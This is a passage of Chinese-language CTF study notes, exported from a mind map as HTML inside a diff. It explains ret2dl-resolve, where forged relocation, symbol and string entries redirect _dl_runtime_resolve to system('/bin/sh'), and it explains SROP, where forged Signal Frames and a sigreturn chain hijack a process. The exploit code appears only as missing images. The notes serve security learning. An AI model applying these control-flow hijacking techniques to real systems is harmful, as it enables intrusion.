+<a name="5oc0gv18pqr62li7bfc91kdc9v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stage3（伪造write函数的重定位表项，并以此调用_dl_runtime_resolve函数解析write函数地址并执行write函数）</a>
+</h3>
+<h3 class="topic">
+<a name="66rb1o3bscggks74uaau0cfkse">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;动态链接重定位表</a>
+</h3>
+<h3 class="topic">
+<a name="4jcig7127vtbaihp39hht4q3pe">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;动态链接时，不论可执行文件或共享对象，一旦引用其他共享对象，就会有导入符号，就会需要被重定位</a>
+</h3>
+<h3 class="topic">
+<a name="1e4h0gfju28f002hpieclb23pr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;动态链接的可执行文件或共享对象即使是PIC编译的，也会需要重定位</a>
+</h3>
+<h3 class="topic">
+<a name="5kmcu54ifb6sg6p7q5h4ibifo4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;虽然使用了PIC，代码段不需要重定位，但是数据端还需要被重定位，因为PIC通过将代码段中的重定位项分离出来，形成了GOT表，GOT表需要在加载的时候被填充</a>
+</h3>
+<h3 class="topic">
+<a name="4it0ttu8pl69mbc9s9g2drt6b8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;数据段除了GOT表还有其他绝对地址引用</a>
+</h3>
+<h3 class="topic">
+<a name="0k6cj6prtdi90h2r8kng1p3v5a">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;动态链接的重定位与静态链接的重定位类似，只不过发生的时机不一样</a>
+</h3>
+<h3 class="topic">
+<a name="1rsftjjr3qsg889kn7m7s6uu2n">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;相关结构</a>
+</h3>
+<h3 class="topic">
+<a name="6icp7ur2hvmcoi5jsj21f3ulvt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.rel.dyn</a>
+</h3>
+<h3 class="topic">
+<a name="63qj5mmb78e5fnsmqp5j45ica7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;相当于静态链接中的.rel.data</a>
+</h3>
+<h3 class="topic">
+<a name="56b547sbutniflqgmv08eqb4nj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;修正位置位于.got和数据段</a>
+</h3>
+<h3 class="topic">
+<a name="4qb76jsan2bmvaqi0v9pscrib2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.rel.plt</a>
+</h3>
+<h3 class="topic">
+<a name="2obfkqktp533qrco79258cld83">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;相当于静态链接中的.rel.text</a>
+</h3>
+<h3 class="topic">
+<a name="44200p5si3kv88un4albch213g">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;修正位置位于.got.plt</a>
+</h3>
+<h3 class="topic">
+<a name="261sjpc025oj4t5ko67akht55i">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;相对于静态链接，动态链接中新的重定位类型</a>
+</h3>
+<h3 class="topic">
+<a name="0p26uvjkmiltq94c1iteeinmom">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/72pbknbqpiu4toq5vlj7u4ir9o.png"></p>
+<h3 class="topic">
+<a name="24m85q7nu2tmrpt7sl6nejavrk">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/1i8g17cn7tuh278307h338p1ku.png"></p>
+<h3 class="topic">
+<a name="65k2mb0ribj4k8g03epeb4kl0j">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/2fi2aqlvh5tqakomj1l2ib0nq5.png"></p>
+<h3 class="topic">
+<a name="5f8mpab6qbp0ha0c1vbcjvndaf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;重定位时填入符号的地址即可</a>
+</h3>
+<h3 class="topic">
+<a name="76e6damv0ekmv8j8jg13bogpal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;的重定位</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/7afjqjdhful4p28rnerna5h0d7.png"></p>
+<h3 class="topic">
+<a name="5qut0ko2blfpgth0g3rv3g4h1m">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/5ijfcgi461qhksk0jatl38r9rg.png"></p>
+<h3 class="topic">
+<a name="10ddiq5m80i7vpaptiadusceeb">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;重定位时填入符号的地址即可</a>
+</h3>
+<h3 class="topic">
+<a name="0mosd7pon3qu8jlflb6s4g6ivp">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/41hp9jn9mu5ts5abjvjcjme3ut.png"></p>
+<h3 class="topic">
+<a name="3qjag8qpkigdt94g50206hsa92">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果一个elf文件以PIC模式编译，则其引用的外部函数的重定位信息保存在.rel.plt中，如果elf不是以PIC编译，则其引用的外部函数的重定位信息保存在.rel.dyn中</a>
+</h3>
+<h3 class="topic">
+<a name="7iqv3i834disiult4np8rmg3qg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/2vqv8dn79ohijarpkqa3vdd8a5.png"></p>
+<h3 class="topic">
+<a name="5vdml0no28sm7pbqaa60p6oso8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于每一个需要重定位的段，都有一个重定位表与之对应</a>
+</h3>
+<h3 class="topic">
+<a name="6b1apqcucbtk6c6je0usa08di4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;动态/静态重定位表的结构</a>
+</h3>
+<h3 class="topic">
+<a name="4l3s9csprn0da2q3dn5v745269">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/7sq7b4j8hdie88esvmthtvhk9u.png"></p>
+<h3 class="topic">
+<a name="7vsph42bdpsnjuj0n6niu7bs98">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;重定位表项中r_offset保=保存需要重定位的数据的内存地址，r_info表示该重定位的类型和符号</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/20nfnebun2h0jc7ngail0p1lu0.png"></p>
+<h3 class="topic">
+<a name="35jloq0qfeg78o80h68ecfh5je">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用readelf -r查询elf文件中的重定位相关信息</a>
+</h3>
+<h3 class="topic">
+<a name="68aeb0jkd80tmhqosvm8tf82up">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以看出write的重定表项的r_offset=0x0804a01c，r_info=0x00000607</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/2ogjke8eiloe8ij79ctsbhes73.png"></p>
+<h3 class="topic">
+<a name="06f671joka98aqnv03dqr6fn9a">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/3le9pn4pal3or5785lv7nv27vi.png"></p>
+<h3 class="topic">
+<a name="65gfq1kqu43t0eis84k2c98rf1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造exp</a>
+</h3>
+<h3 class="topic">
+<a name="2t0cvpgepf600ttqp7ov25v5cm">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/5vnbbd4ag5qtssh5ibtt15h3v0.png"></p>
+<h3 class="topic">
+<a name="7n3qcs9t8vt5aeh61223bg7nei">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最终通过伪造的write函数重定位表项，成功执行dl_runtime_resolve函数，最终执行write函数</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/4ic2c9jmq6noeu5j2q77bf8087.png"></p>
+<h3 class="topic">
+<a name="46e2cof1ptfurbtr623n78n5d0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stage4（伪造write函数的重定位表项和符号表项，并以此调用_dl_runtime_resolve函数解析write函数地址并执行write函数）</a>
+</h3>
+<h3 class="topic">
+<a name="74vf7cujsd2reu595nj19d7918">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据stage3可知，write函数重定位表项中&#13;
+r_offset=0x0804a01c，r_info=0x00000607</a>
+</h3>
+<h3 class="topic">
+<a name="4qid8ucrr3d2lpvasci7teai6v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r_info中高24位表示重定位对应符号在符号表中的下标（注意是下标不是偏移），低8位表示重定位的入口类型</a>
+</h3>
+<h3 class="topic">
+<a name="0f4g374s9bavs7qi7820iuk0ju">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以write函数对应的符号表项的下标为0x607&gt;&gt;8=0x6，即下标为6</a>
+</h3>
+<h3 class="topic">
+<a name="4craii4b2m908tmmndd6nfq55l">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;查看程序动态链接符号表</a>
+</h3>
+<h3 class="topic">
+<a name="37qpvjihrhs70nsbdijhhunv8t">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/7hbvj3ruqq9pvl0m1bimb0l2ev.png"></p>
+<h3 class="topic">
+<a name="51a33dosuq6k39djcdkkukf8pn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从中可以看到write函数的函数名字符串在字符串表中的下标为0x4c</a>
+</h3>
+<h3 class="topic">
+<a name="5jb43f0j3hdvuai2a4oqp9c41g">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造exp</a>
+</h3>
+<h3 class="topic">
+<a name="46g4goe6ti3qq0ne9skb8q90gd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/1i58bjnvtk99l87rinoeioo8k0.png"></p>
+<h3 class="topic">
+<a name="7otq81ug1hnq4a7hl12r0liclq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;整个exp的核心就是伪造了write函数的重定位表项和符号表项，所以在执行_dl_runtime_resolve函数的过程中，函数会使用伪造的重定位表项和符号表表项作为寻找write函数的标准</a>
+</h3>
+<h3 class="topic">
+<a name="3jm2p3076s842vjurfojd7euo9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/0e24dve26g3ea8as9dsig47blu.png"></p>
+<h3 class="topic">
+<a name="33ila996pdbnvl95rq6p094100">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最终执行的效果还是通过执行write函数输出'\bin\sh'字符串</a>
+</h3>
+<h3 class="topic">
+<a name="2t7sdfhfci04vpbtjqsm6dam8n">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stage5（伪造write函数的重定位表项、符号表项、字符串表项，并调用_dl_runtime_resolve函数解析write函数地址并执行write函数）</a>
+</h3>
+<h3 class="topic">
+<a name="01nik1alc8nts86ljs6e09flr4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/2pdn7p4qp8kkk0na03og7893ec.png"></p>
+<h3 class="topic">
+<a name="5j6mqg085t2vmhs9t4892027dr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;核心就是自己指定了伪造符号表项的st_name的内容，从而让_dl_runtime_resolve获取任意指定的函数的地址</a>
+</h3>
+<h3 class="topic">
+<a name="5damki3bhtdl5aqgn40jtj1jup">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/40suig4m12c84t7dvugdo4g0ll.png"></p>
+<h3 class="topic">
+<a name="7sss8qhu9a7jobjgh46pf8inde">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为这里这里函数字符串是"write"所以最后效果还是调用write函数输出"/bin/sh"字符串</a>
+</h3>
+<h3 class="topic">
+<a name="1fevoj936rq2i46gjn2485j1gg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stage6</a>
+</h3>
+<h3 class="topic">
+<a name="4f6ujbfucuv17uif9n4nq6719f">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这部分与stage5一样</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/7p1idcdlj3di2dicmcb97c7ck0.png"></p>
+<h3 class="topic">
+<a name="5m432gph40jd1jidh7svve8sjt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;与stage不同点在于将_dl_runtime_resolve函数搜索的字符串修改为system0x00，然后将函数参数从原来的write函数的三个参数调整为 system函数的一个参数，从而执行system('/bin/sh')</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/4eri635d3unadi3pqa3e8qbrp7.png"></p>
+<h3 class="topic">
+<a name="6msq2potgfjm1t9pd3omik9ml3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据输出结果，发现字符串'/bin/sh0x00'的偏移的确为82，可能是之前字符串system0x00的对齐造成的</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/4lh8gq9jq1pp5e5atf5c6smdj6.png"></p>
+<h3 class="topic">
+<a name="6115gcg31gobvuht0ur5odou6l">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里为何是82仍然不明白，需要后续进一步调试</a>
+</h3>
+<h3 class="topic">
+<a name="5a7126o4sttuu4ci9jrleo5oec">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过工具攻击</a>
+</h3>
+<h3 class="topic">
+<a name="4k8lvf0f73tjk3lchob9u3deop">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;相关工具</a>
+</h3>
+<h3 class="topic">
+<a name="2dfcpmtch7p0r540ffgu8l5698">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://github.com/inaz2/roputils</a>
+</h3>
+<h3 class="topic">
+<a name="1lrmd6ul19gvd7hvf2l1vg39fa">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://gloxec.github.io/2018/04/12/roputils/</a>
+</h3>
+<h3 class="topic">
+<a name="3nc5gtd0nppmffclme0i6ot68f">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a>
+</h3>
+<h3 class="topic">
+<a name="0sut2f2b3fqsu8ggv1jrebm9q8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;工具代码</a>
+</h3>
+<h3 class="topic">
+<a name="4oc165pghqbifpprl9ssbkcoun">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意根据导入包的情况来看，程序中仅使用了pwntools提供的process gdb context，其他类例如ROP类等均是由roputils提供的，这些类的具体功能可以参考github</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/0l2dr2q3shfl8eoasckpt7gr3s.png"></p>
+<h3 class="topic">
+<a name="057o25m0psko53ecpocpj522pt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行之后效果</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/0tootub8iphvpibha778l9lmjl.png"></p>
+<h3 class="topic">
+<a name="6eov008pn0ou6fas3s3nfvlmrb">&nbsp;&nbsp;SROP</a>
+</h3>
+<h3 class="topic">
+<a name="0i3g1mlstvt2jrntfar60dc8bo">&nbsp;&nbsp;&nbsp;signal机制</a>
+</h3>
+<h3 class="topic">
+<a name="39ee4ucdljl51tcfak73jlp0dj">&nbsp;&nbsp;&nbsp;&nbsp;定义</a>
+</h3>
+<h3 class="topic">
+<a name="0jvvcqf444m7ibg9hug6kbv4he">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;是UNIX内核中一种进程间通讯的机制，是一种软件中断，用于在不同的进程之间传递信息，操作系统通过signal机制实现杀死一个进程（`kill -9 $PID`），再比如为进程设置定时器，或者通知进程一些异常事件等等。</a>
+</h3>
+<h3 class="topic">
+<a name="05k8varr1g3c7uojs2sdg5he64">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/4td843lgt03ctghdfbg206hv6r.png"></p>
+<h3 class="topic">
+<a name="5fmetu5nsbmhieniui50k1055n">&nbsp;&nbsp;&nbsp;&nbsp;重要概念</a>
+</h3>
+<h3 class="topic">
+<a name="5tub1v5v4v8vbp1ppdidsqla2g">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;signall</a>
+</h3>
+<h3 class="topic">
+<a name="6pr1r8gdslihchof2uiundn5n2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;进程间传递的一种信号，类比windows内核中的io控制码</a>
+</h3>
+<h3 class="topic">
+<a name="3llhlcat4n4n75ags91hl7rgl7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;signal handler</a>
+</h3>
+<h3 class="topic">
+<a name="5as2t6dt3jrv7ldl66t7qlrnht">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对应signal的处理函数，类比内核中特定io控制码对应的处理函数</a>
+</h3>
+<h3 class="topic">
+<a name="25fqlutprteltr54708v0r97ro">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;适用于实质上实现signal功能的函数</a>
+</h3>
+<h3 class="topic">
+<a name="6is3567g4qf99kfr7d3d037u8u">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rt_sigreturn</a>
+</h3>
+<h3 class="topic">
+<a name="5nslmn2u1mg8mp07i1tf879qa1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;是一个地址，当进程接收到signal之后，程序进入内核态，将进程上下文保存到栈中，此时rt_sigreturn被保存在栈顶</a>
+</h3>
+<h3 class="topic">
+<a name="7mj58ppr9gktm7058sj6o6hv0u">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rt_sigreturn指向一段代码，该代码会调用sigreturn系统调用</a>
+</h3>
+<h3 class="topic">
+<a name="287b0v9prb48c2i807nuh7orp4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Signal Frame</a>
+</h3>
+<h3 class="topic">
+<a name="5c80njnl3k0rideo4cojlr60h8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;是栈中的一段数据，以rt_sigreturn开头，后面跟进程上下文以及signal信息，当进程接收到signal后，进程进入内核态，将Signal Frame保存到用户栈上</a>
+</h3>
+<h3 class="topic">
+<a name="3gpf5evperl24iekj8udgrklal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/1je0a9befue2r1fjcqgfkps6fj.png"></p>
+<h3 class="topic">
+<a name="6kn6ejiu81opuplk3d66bdkvcg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/42m8g0sbnamcjajui2mbnee37p.png"></p>
+<h3 class="topic">
+<a name="6274thon46dglaobf6gbl9jisn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sigreturn</a>
+</h3>
+<h3 class="topic">
+<a name="13mhpkgt3dgnrnmjud4h7k66vv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;是一个系统调用，专门根据当前栈中数据恢复进程上下文，即根据栈中数据对寄存器进行赋值</a>
+</h3>
+<h3 class="topic">
+<a name="2385eo7s964mshf7qqj889n91i">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;32位的sigreturn的调用号为77，64位的系统调用号为15。</a>
+</h3>
+<h3 class="topic">
+<a name="558sdrdlir1tisslt24psim4g7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sigreturn这个系统调用和别的系统调用有一个不同的地方，即一般的应用程序不会主动调用它，而是像之前介绍的，由内核将相应地址填到栈上，使得应用进程被动地调用。所以系统中一般有一段专门的代码用于调用sigreturn</a>
+</h3>
+<h3 class="topic">
+<a name="35tipcnoqbqcmrljkql1996f85">&nbsp;&nbsp;&nbsp;&nbsp;流程</a>
+</h3>
+<h3 class="topic">
+<a name="2dvnt4qo1kok7avlit8u2qlkpi">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/1mrvtguh4uuk9oduhg92ouvo8m.png"></p>
+<h3 class="topic">
+<a name="1lfcfbd0bn92khj13gi5p0dup2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1、用户进程收到signal，进程被挂起，进入内核态，内核将当前进程的上下文保存到用户态栈空间中，并在栈顶填上一个地址`rt_sigreturn`，此时整个栈空间中情况为右图，这样一段内存被称为Signal Frame</a>
+</h3>
+<h3 class="topic">
+<a name="2hdj8qn6ikcj128svkhjj0pf4t">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/76e6vnc1vl2r0n34gdpj5j8cec.png"></p>
+<h3 class="topic">
+<a name="0sdvgskrga411e8opgc97gmdil">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2、在内核态中，进程上下文保存完毕之后，程序跳转到之前注册好的signal handler函数中处理相应signal，即signal handler就是对应signal的处理函数，发送signal所期望的效果由signal handler函数实现</a>
+</h3>
+<h3 class="topic">
+<a name="5qg86r0mdqkcot3lsdkvjvfuic">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3、signal handler函数执行完毕后，程序返回内核态，将之前保存的进程上下文恢复，从而保证之前挂起的进程能继续执行</a>
+</h3>
+<h3 class="topic">
+<a name="11qsmhkask59hk7b0i7782qcju">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这一步不同的类UNIX系统实现方法不同，在linux中，当signal handler函数执行ret指令返回前，栈顶指针指向Signal Frame中的`rt_sigreturn`，当`signal handler函数返回后，会从rt_sigreturn地址处开始执行指令</a>
+</h3>
+<h3 class="topic">
+<a name="042iqa428suv59hbem8tfg444o">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`rt_sigreturn`这个地址指向一段代码，在这段代码中会调用`sigreturn`系统调用，sigreturn系统调用专门用于将进程上下文恢复，所以该系统调用会根据当前Signal Frame中的信息，设置寄存器的值，恢复进程上下文</a>
+</h3>
+<h3 class="topic">
+<a name="6sqckj9sam01tgplcnega80kfh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4、进程上下文恢复，此时挂起的进程得以继续执行</a>
+</h3>
+<h3 class="topic">
+<a name="50j47j8lhu1qvn1dhn2ktli2pk">&nbsp;&nbsp;&nbsp;signal机制缺陷</a>
+</h3>
+<h3 class="topic">
+<a name="4eeiprn956o1tcs2eq75gmnu85">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/7tufssokd9dboqkg573mf15a1t.png"></p>
+<h3 class="topic">
+<a name="4vuvpfc5bnqo8k3bptovc8agoa">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1、Signal Frame保存在用户态栈中，可以被修改</a>
+</h3>
+<h3 class="topic">
+<a name="1qij0fvqbf3kg3331venl8g7l9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2、第三步中，内核态程序根据Signal Frame恢复进程上下文时，没有检验Signal Frame是否被更改，如果Signal Frame被栈溢出更改，则可以利用其修改寄存器的值，从而执行恶意代码</a>
+</h3>
+<h3 class="topic">
+<a name="2h3amp4equjk88uj0pvaeaj7cm">&nbsp;&nbsp;&nbsp;攻击案例（主要攻击思路就是伪造用户态栈中的Signal Frame，利用sigreturn系统调用，赋值寄存器的值，从而劫持进程）</a>
+</h3>
+<h3 class="topic">
+<a name="06rkqkoehl3rl274ratc0h8cfv">&nbsp;&nbsp;&nbsp;&nbsp;通过int 0x80（即suscall） 执行execve('/bin/sh')获得shell</a>
+</h3>
+<h3 class="topic">
+<a name="2v02o1akjb4l33kjp0407nt6hn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/1cbjciu599qom7o23bqdf6bmub.png"></p>
+<h3 class="topic">
+<a name="78cr0tm8t4is61cc88m22idaad">&nbsp;&nbsp;&nbsp;&nbsp;利用SROP构造系统调用链</a>
+</h3>
+<h3 class="topic">
+<a name="19viks3re276r426lv5aat1i0r">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/3a99c2228is2tbebqrd74i72el.png"></p>
+<h3 class="topic">
+<a name="3vckuigossc4tksp1mrv030m29">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将rip指向 syscall ret指令，并且将前一个Signal Frame中的rsp指向后一个Signal Frame的rt_sigreturn，这样当第一个Signal Frame发挥作用之后，程序返回到sigreturn系统调用继续执行，从而根据第二个Signal Frame的信息修改寄存器的值，继续执行指令</a>
+</h3>
+<h3 class="topic">
+<a name="1u5tmuh3pgakl0h0f03ald2pe0">&nbsp;&nbsp;&nbsp;如何寻找来两个关键的gadget（syscall ret sigreturn）</a>
+</h3>
+<h3 class="topic">
+<a name="2bataer8j64gag4hs3bs6ugu4q">&nbsp;&nbsp;&nbsp;&nbsp;寻找sigreturn</a>
+</h3>
+<h3 class="topic">
+<a name="7qibodokqkv7vpvch2haeim286">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/48fgjqe1042pvebuedg41m8481.png"></p>
+<h3 class="topic">
+<a name="2pgk6lbm9f06p343l4id96mknk">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/5eic6eck0v81t3008rqb86dh0d.png"></p>
+<h3 class="topic">
+<a name="2rqo94no9q5hfkcn324bql65n6">&nbsp;&nbsp;&nbsp;&nbsp;寻找syscall ret</a>
+</h3>
+<h3 class="topic">
